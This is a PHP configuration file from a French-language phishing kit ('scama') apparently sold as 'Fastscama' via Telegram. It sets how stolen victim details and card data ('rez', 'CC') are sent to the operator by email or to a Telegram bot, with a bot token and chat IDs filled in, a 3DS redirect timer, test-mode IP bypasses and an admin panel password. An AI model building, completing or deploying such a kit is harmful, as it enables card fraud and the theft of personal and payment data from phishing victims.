<?php

/*
 ______        _                                                
|  ___|      | |                                                               
| |_ __ _ ___| |_   ___  ___ __ _ _ __ ___   __ _ 
|  _/ _` / __| __| / __|/ __/ _` | '_ ` _ \ / _` |
| || (_| \__ \ |_  \__ \ (_| (_| | | | | | | (_| |
\_| \__,_|___/\__| |___/\___\__,_|_| |_| |_|\__,_|
               
*/ 

/* --- New Page Settings 2024 --- */
/* © Fastscama on télégram */

/* Configurations si tu veux recevoir Email/Tlg */
$mail_sending = false;      // Recevoir rez par email (ATTENTION PAS TOUS LES VPS ONT LE PORT D'OUVERT)
$telegram_sending = true;   // Recevoir rez sur télégram
$rezmail = '';                  /* Configurations de ton mail ci-dessous */



/* Configurations de tes clés Télégram ci-dessous */
$bot_token  = '6712497713:AAGfvuE_5K9x9MGbnIKVKKVTPbpK-kIdkeo'; // Bot token de ton bot tlg
$chat_rez = '5390597486'; // Chat id de ton compte
$chat_visits ="5390597486";
$chat_autoriser ="5390597486";



$timer = 20;                  /* Temps redirections CC > 3DS si activé.*/
$info_sending = true;        /* True = Tu recois la rez des infos et la cc apres | False = tu recevras info + cc en une rez */


/*      Configurations IP TEST MODE  et Admin Panel    */
$ip_bypass  = '127.0.0.1';      // Permet de tester ce scama avec l'IP que tu mets ici
$ip_dev     ='127.0.0.1';       // Permet de tester ce scama avec l'IP que tu mets ici
$mdp_panel = "123456!";          // Mot de Passe Panel ./server/panel/

?>
